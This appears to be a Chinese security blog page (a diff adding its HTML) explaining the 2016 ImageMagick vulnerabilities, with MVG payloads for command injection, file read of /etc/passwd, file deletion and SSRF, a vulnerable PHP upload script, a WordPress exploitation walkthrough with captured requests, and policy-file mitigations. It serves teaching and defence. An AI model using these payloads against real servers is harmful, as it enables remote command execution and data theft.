@@ -1,0 +1,706 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.0.1" />
+
+
+
+
+
+
+<meta name="description" content="可以暂停音乐哦！ 
+
+
+
+ImageMagick简介：ImageMagick是一套功能强大、稳定而且开源的工具集和开发包，可以用来读、写和处理超过89种基本格式的图片文件，包括流行的TIFF、JPEG、GIF、 PNG、PDF以及PhotoCD等格式。利用ImageMagick，你可以根据web应用程序的需要动态生成图片, 还可以对一个（或一组）图片进行改变大小、旋转、锐化、减色或增加特效等操作，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ImageMagick、FFMpeg">
+<meta property="og:url" content="http://yoursite.com/2016/05/18/ImageMagick、FFMpeg/index.html">
+<meta property="og:site_name" content="EvilAnne's Blog">
+<meta property="og:description" content="可以暂停音乐哦！ 
+
+
+
+ImageMagick简介：ImageMagick是一套功能强大、稳定而且开源的工具集和开发包，可以用来读、写和处理超过89种基本格式的图片文件，包括流行的TIFF、JPEG、GIF、 PNG、PDF以及PhotoCD等格式。利用ImageMagick，你可以根据web应用程序的需要动态生成图片, 还可以对一个（或一组）图片进行改变大小、旋转、锐化、减色或增加特效等操作，">
+<meta property="og:image" content="http://i.imgur.com/FMTt7kC.png">
+<meta property="og:image" content="http://i.imgur.com/uU4eyqF.png">
+<meta property="og:image" content="http://i.imgur.com/yK8bb59.png">
+<meta property="og:image" content="http://i.imgur.com/6l6e5sP.png">
+<meta property="og:updated_time" content="2016-06-30T14:00:02.904Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ImageMagick、FFMpeg">
+<meta name="twitter:description" content="可以暂停音乐哦！ 
+
+
+
+ImageMagick简介：ImageMagick是一套功能强大、稳定而且开源的工具集和开发包，可以用来读、写和处理超过89种基本格式的图片文件，包括流行的TIFF、JPEG、GIF、 PNG、PDF以及PhotoCD等格式。利用ImageMagick，你可以根据web应用程序的需要动态生成图片, 还可以对一个（或一组）图片进行改变大小、旋转、锐化、减色或增加特效等操作，">
+<meta name="twitter:image" content="http://i.imgur.com/FMTt7kC.png">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"post"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 0,
+      author: '博主'
+    }
+  };
+</script>
+
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                history.back();
+            }
+        }
+    })();
+</script>
+
+  <title> ImageMagick、FFMpeg | EvilAnne's Blog </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">EvilAnne's Blog</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle"></p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                ImageMagick、FFMpeg
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2016-05-18T20:11:58+08:00" content="2016-05-18">
+              2016-05-18
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/网络安全/" itemprop="url" rel="index">
+                    <span itemprop="name">网络安全</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2016/05/18/ImageMagick、FFMpeg/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/05/18/ImageMagick、FFMpeg/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <font color="red">可以暂停音乐哦！ </font>
+
+<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="http://music.163.com/outchain/player?type=2&id=2698075&auto=0&height=66"></iframe>
+
+<h2 id="ImageMagick"><a href="#ImageMagick" class="headerlink" title="ImageMagick"></a>ImageMagick</h2><h3 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h3><p>ImageMagick是一套功能强大、稳定而且开源的工具集和开发包，可以用来读、写和处理超过89种基本格式的图片文件，包括流行的TIFF、JPEG、GIF、 PNG、PDF以及PhotoCD等格式。利用ImageMagick，你可以根据web应用程序的需要动态生成图片, 还可以对一个（或一组）图片进行改变大小、旋转、锐化、减色或增加特效等操作，并将操作的结果以相同格式或其它格式保存，对图片的操作，<font color="red">即可以通过命令行进行，也可以用C/C++、Perl、Java、PHP、Python或Ruby编程来完成。</font>同时ImageMagick提供了一个高质量的2D工具包，部分支持SVG。ImageMagic的主要精力集中在性能，减少bug以及提供稳定的API和ABI上。</p>
+<a id="more"></a>
+<p>我比较渣，没办法写出原理的什么直接copy别人：</p>
+<p>ImageMagick有一个功能叫做delegate（委托），作用是调用外部的lib来处理文件。而调用外部lib的过程是使用系统的system命令来执行的<br><a href="https://github.com/ImageMagick/ImageMagick/blob/e93e339c0a44cec16c08d78241f7aa3754485004/MagickCore/delegate.c#L347" target="_blank" rel="external">参考地址</a></p>
+<p>漏洞报告中给出的POC是利用了如下的这个委托：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">delegate</span> <span class="attr">decode</span>=<span class="string">"https"</span> <span class="attr">command</span>=<span class="string">"&amp;quot;curl&amp;quot; -s -k -o &amp;quot;%o&amp;quot; &amp;quot;https:%M&amp;quot;"</span>/&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>它在解析https图片的时候，使用了curl命令将其下载</p>
+<p>所以我们可以构造一个.mvg格式的图片（但文件名可以不为.mvg，比如下图中包含payload的文件的文件名为vul.gif，而ImageMagick会根据其内容识别为mvg图片），并在<a href="https://后面闭合双引号，写入自己要执行的命令：" target="_blank" rel="external">https://后面闭合双引号，写入自己要执行的命令：</a></p>
+<p><br></p>
+<h3 id="利用EXP"><a href="#利用EXP" class="headerlink" title="利用EXP"></a>利用EXP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &apos;url(https://&quot;|id &gt; /tmp/id.txt; &quot;)&apos;</span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure>
+<p>PHP漏洞代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Error: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] . <span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line">    $dest_file = <span class="string">"./images/"</span>.md5(uniqid(rand())).<span class="string">".png"</span>;</span><br><span class="line">    $thumb = <span class="keyword">new</span> Imagick();</span><br><span class="line">    $thumb-&gt;readImage($temp_file);</span><br><span class="line">    $thumb-&gt;writeImage($dest_file);</span><br><span class="line">    $thumb-&gt;clear();</span><br><span class="line">    $thumb-&gt;destroy();</span><br><span class="line">    unlink($temp_file);</span><br><span class="line">    <span class="keyword">echo</span> $dest_file;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="http://i.imgur.com/FMTt7kC.png" alt="http://i.imgur.com/FMTt7kC.png"></p>
+<p>可以看到访问后图片是空白，其实已经执行了命令，这里我输出到了/tmp/id.txt文件里面</p>
+<h3 id="CVE对应的漏洞："><a href="#CVE对应的漏洞：" class="headerlink" title="CVE对应的漏洞："></a>CVE对应的漏洞：</h3><blockquote>
+<p>   CVE-2016 3714    由于过滤字符串不严，存在代码执行漏洞<br>CVE-2016 3715    文件删除漏洞<br>CVE-2016 3716    移动文件漏洞<br>CVE-2016 3717    本地文件读取漏洞<br>CVE-2016 3718    SSRF漏洞</p>
+</blockquote>
+<h3 id="CVE-2016-3714-（代码执行漏洞"><a href="#CVE-2016-3714-（代码执行漏洞" class="headerlink" title="CVE-2016-3714 （代码执行漏洞)"></a>CVE-2016-3714 （代码执行漏洞)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &apos;url(https://example.com/image.jpg&quot;|ls &quot;-la)&apos;</span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure>
+<h3 id="CVE-2016-3715-（文件删除漏洞"><a href="#CVE-2016-3715-（文件删除漏洞" class="headerlink" title="CVE-2016-3715 （文件删除漏洞)"></a>CVE-2016-3715 （文件删除漏洞)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">image over 0,0 0,0 &apos;ephemeral:/tmp/delete.txt&apos;</span><br><span class="line">popgraphic-context</span><br></pre></td></tr></table></figure>
+<p>可是通过我测试好并不是删除吧！  是读取文件</p>
+<h3 id="CVE-2016-3716-移动文件漏洞"><a href="#CVE-2016-3716-移动文件漏洞" class="headerlink" title="CVE-2016 3716 (移动文件漏洞)"></a>CVE-2016 3716 (移动文件漏洞)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">image over 0,0 0,0 &apos;msl:/tmp/msl.txt&apos;</span><br><span class="line">popgraphic-context</span><br></pre></td></tr></table></figure>
+<h3 id="CVE-2016-3717-读取文件漏洞"><a href="#CVE-2016-3717-读取文件漏洞" class="headerlink" title="CVE-2016-3717 (读取文件漏洞)"></a>CVE-2016-3717 (读取文件漏洞)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">image over 0,0 0,0 &apos;label:@...c/passwd&apos;</span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure>
+<h3 id="CVE-2016-3718-SSRF漏洞"><a href="#CVE-2016-3718-SSRF漏洞" class="headerlink" title="CVE-2016-3718 (SSRF漏洞)"></a>CVE-2016-3718 (SSRF漏洞)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &apos;url(http://example.com/)&apos;</span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure>
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>处理图片前，先检查图片的 “magic bytes”，也就是图片头，如果图片头不是你想要的格式，那么就不调用ImageMagick处理图片。如果你是php用户，可以使用getimagesize函数来检查图片格式，而如果你是wordpress等web应用的使用者，可以暂时卸载ImageMagick，使用php自带的gd库来处理图片。</p>
+<p>使用policy file来防御这个漏洞，这个文件默认位置在 /etc/ImageMagick/policy.xml ，我们通过配置如下的xml来禁止解析https等敏感操作：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">policymap</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">policy</span> <span class="attr">domain</span>=<span class="string">"coder"</span> <span class="attr">rights</span>=<span class="string">"none"</span> <span class="attr">pattern</span>=<span class="string">"EPHEMERAL"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">policy</span> <span class="attr">domain</span>=<span class="string">"coder"</span> <span class="attr">rights</span>=<span class="string">"none"</span> <span class="attr">pattern</span>=<span class="string">"URL"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">policy</span> <span class="attr">domain</span>=<span class="string">"coder"</span> <span class="attr">rights</span>=<span class="string">"none"</span> <span class="attr">pattern</span>=<span class="string">"HTTPS"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">policy</span> <span class="attr">domain</span>=<span class="string">"coder"</span> <span class="attr">rights</span>=<span class="string">"none"</span> <span class="attr">pattern</span>=<span class="string">"MVG"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">policy</span> <span class="attr">domain</span>=<span class="string">"coder"</span> <span class="attr">rights</span>=<span class="string">"none"</span> <span class="attr">pattern</span>=<span class="string">"MSL"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">policymap</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="ImageMagick漏洞测试wordpress"><a href="#ImageMagick漏洞测试wordpress" class="headerlink" title="ImageMagick漏洞测试wordpress"></a>ImageMagick漏洞测试wordpress</h3><p>Wordpress 在图像处理的时候默认优先选择 Imagick Library。</p>
+<p>这个漏洞可以导致命令执行，但是还需要wordpress一定权限，如果运气好可以通过wpscan跑出用户和密码， 或者只能找注入了，这个漏洞要有一定的权限至少要有上传。</p>
+<p>新建－&gt; 文章 -&gt; 添加媒体</p>
+<p>先上传一个正常的图片<br>上传图片 -&gt; 插入图片 -&gt;编辑 -&gt; 替换原始文件<br>获取 _ajax_nonce 和 post_id 中的值：<br>记录当前所抓取的包：</p>
+<p><img src="http://i.imgur.com/uU4eyqF.png" alt="http://i.imgur.com/uU4eyqF.png"></p>
+<blockquote>
+<p>GET  /wp-admin/admin-ajax.php?action=imgedit-preview&amp;_ajax_nonce=157aacb216&amp;postid=5&amp;history=%5B%7B%22f%22%3A1%7D%5D&amp;rand=578533 HTTP/1.1<br>Host: ad67d5fdfd41d33ed.jie.sangebaimao.com<br>User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0<br>Accept: image/png,image/<em>;q=0.8,</em>/*;q=0.5<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate<br>Referer: <a href="http://ad67d5fdfd41d33ed.jie.sangebaimao.com/wp-admin/post-new.php" target="_blank" rel="external">http://ad67d5fdfd41d33ed.jie.sangebaimao.com/wp-admin/post-new.php</a><br>Cookie: wordpress_f15c0a72b5009b89225811909e9b997f=admin%7C1463749206%7Cmz0uD3DxIWag0NzLkV9Ohd39ntjlxpBM6P8af4yEsjJ%7C397426fa7c3007894a2250755f8ed7d2806d0f15aca631ecdd0eef27dc86ad5a; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_f15c0a72b5009b89225811909e9b997f=admin%7C1463749206%7Cmz0uD3DxIWag0NzLkV9Ohd39ntjlxpBM6P8af4yEsjJ%7C7fca88683607c60a64516f1c0894dad3a4efc81a28076932f1f169238f343f1b; wp-settings-time-1=1463576413; wp-settings-1=libraryContent%3Dbrowse<br>Connection: keep-alive</p>
+</blockquote>
+<p>抓区完成后再上传exp.png图片，图片内容为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &apos;url(https://&quot;|id &gt; /tmp/id.txt; &quot;)&apos;</span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure>
+<p>上传图片 -&gt; 插入图片 -&gt;编辑 -&gt; 替换原始文件 -&gt;抓包</p>
+<p><img src="http://i.imgur.com/yK8bb59.png" alt="http://i.imgur.com/yK8bb59.png"></p>
+<p>action=image-editor&amp;<font color="red">_ajax_nonce=0e339a323d&amp;postid=6</font>&amp;do=open</p>
+<p>把这里获取到的值，替换正常图片的URL中：</p>
+<blockquote>
+<p>GET /wp-admin/admin-ajax.php?action=imgedit-preview&amp;<font color="red">_ajax_nonce=0e339a323d&amp;postid=6</font>&amp;history=%5B%7B%22f%22%3A1%7D%5D&amp;rand=578533 HTTP/1.1<br>Host: ad67d5fdfd41d33ed.jie.sangebaimao.com<br>User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0<br>Accept: image/png,image/<em>;q=0.8,</em>/*;q=0.5<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate<br>Referer: <a href="http://ad67d5fdfd41d33ed.jie.sangebaimao.com/wp-admin/post-new.php" target="_blank" rel="external">http://ad67d5fdfd41d33ed.jie.sangebaimao.com/wp-admin/post-new.php</a><br>Cookie: wordpress_f15c0a72b5009b89225811909e9b997f=admin%7C1463749206%7Cmz0uD3DxIWag0NzLkV9Ohd39ntjlxpBM6P8af4yEsjJ%7C397426fa7c3007894a2250755f8ed7d2806d0f15aca631ecdd0eef27dc86ad5a; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_f15c0a72b5009b89225811909e9b997f=admin%7C1463749206%7Cmz0uD3DxIWag0NzLkV9Ohd39ntjlxpBM6P8af4yEsjJ%7C7fca88683607c60a64516f1c0894dad3a4efc81a28076932f1f169238f343f1b; wp-settings-time-1=1463576413; wp-settings-1=libraryContent%3Dbrowse<br>Connection: keep-alive</p>
+</blockquote>
+<p>提交后再看看服务器上有没有生成id.txt的文件</p>
+<p><img src="http://i.imgur.com/6l6e5sP.png" alt="http://i.imgur.com/6l6e5sP.png"></p>
+<h2 id="FFMpeg"><a href="#FFMpeg" class="headerlink" title="FFMpeg"></a>FFMpeg</h2><p><a href="http://drops.wooyun.org/papers/15598" target="_blank" rel="external">FFMpeg漏洞参考地址</a></p>
+
+      
+    </div>
+
+    <div>
+      
+        
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2016/05/16/2016目标/" rel="next" title="2016目标">
+                <i class="fa fa-chevron-left"></i> 2016目标
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2016/05/19/Docker未授权访问/" rel="prev" title="Docker未授权访问">
+                Docker未授权访问 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div class="ds-thread" data-thread-key="2016/05/18/ImageMagick、FFMpeg/"
+           data-title="ImageMagick、FFMpeg" data-url="http://yoursite.com/2016/05/18/ImageMagick、FFMpeg/">
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.png"
+               alt="EvilAnne" />
+          <p class="site-author-name" itemprop="name">EvilAnne</p>
+          <p class="site-description motion-element" itemprop="description">比天赋更重要的是变强起来的勇气</p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">128</span>
+              <span class="site-state-item-name">日志</span>
+            </a>
+          </div>
+
+          
+            <div class="site-state-item site-state-categories">
+              <a href="/categories">
+                <span class="site-state-item-count">11</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">8</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#ImageMagick"><span class="nav-number">1.</span> <span class="nav-text">ImageMagick</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#简介："><span class="nav-number">1.1.</span> <span class="nav-text">简介：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用EXP"><span class="nav-number">1.2.</span> <span class="nav-text">利用EXP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CVE对应的漏洞："><span class="nav-number">1.3.</span> <span class="nav-text">CVE对应的漏洞：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CVE-2016-3714-（代码执行漏洞"><span class="nav-number">1.4.</span> <span class="nav-text">CVE-2016-3714 （代码执行漏洞)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CVE-2016-3715-（文件删除漏洞"><span class="nav-number">1.5.</span> <span class="nav-text">CVE-2016-3715 （文件删除漏洞)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CVE-2016-3716-移动文件漏洞"><span class="nav-number">1.6.</span> <span class="nav-text">CVE-2016 3716 (移动文件漏洞)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CVE-2016-3717-读取文件漏洞"><span class="nav-number">1.7.</span> <span class="nav-text">CVE-2016-3717 (读取文件漏洞)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CVE-2016-3718-SSRF漏洞"><span class="nav-number">1.8.</span> <span class="nav-text">CVE-2016-3718 (SSRF漏洞)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞修复"><span class="nav-number">1.9.</span> <span class="nav-text">漏洞修复</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ImageMagick漏洞测试wordpress"><span class="nav-number">1.10.</span> <span class="nav-text">ImageMagick漏洞测试wordpress</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FFMpeg"><span class="nav-number">2.</span> <span class="nav-text">FFMpeg</span></a></li></ol></div>
+            
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+<div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">EvilAnne</span>
+</div>
+
+<div class="powered-by">
+  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+  <span id="busuanzi_container_site_pv">访问量<span id="busuanzi_value_site_pv"></span>次</span>
+</div>
+
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.0.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.1"></script>
+
+
+
+  
+
+  
+    
+  
+
+  <script type="text/javascript">
